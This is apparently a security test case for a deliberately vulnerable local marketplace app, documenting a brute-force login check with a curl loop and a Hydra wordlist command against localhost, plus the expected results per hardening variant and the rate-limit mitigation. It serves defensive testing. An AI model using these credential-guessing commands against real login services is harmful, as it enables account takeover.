# T11 — Brute force login

## Wektor ataku

OWASP A07:2021 (Identification and Authentication Failures). No rate limit on login attempts.

## Setup

1. `git checkout <branch>`
2. `pnpm dev`

## Payload

```bash
# Try 50 logins in 10 seconds
for i in $(seq 1 50); do
  curl -X POST http://localhost:3000/api/auth/callback/credentials \
    -d "email=admin@nextmarket.test&password=wrong-$i" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -w "%{http_code}\n" -o /dev/null -s
done
```

Or with Hydra:

```bash
hydra -l admin@nextmarket.test -P /usr/share/wordlists/rockyou.txt \
  localhost -s 3000 http-post-form \
  "/api/auth/callback/credentials:email=^USER^&password=^PASS^:Invalid"
```

## Expected result per variant

- **baseline:** all 50 requests get 200/401, no throttling. Plain-text passwords in DB so a successful match = full takeover.
- **typical:** same throttling absent, but bcrypt slows guessing somewhat.
- **hardened:** request 6+ in same 60-second window returns `429 Too Many Requests` with `Retry-After`.

## Verification tools

- curl loop
- Hydra

## Mitigation reference

`hardened`: `src/middleware.ts` rate-limits `/api/auth/callback/credentials` POST to 5/min per IP.
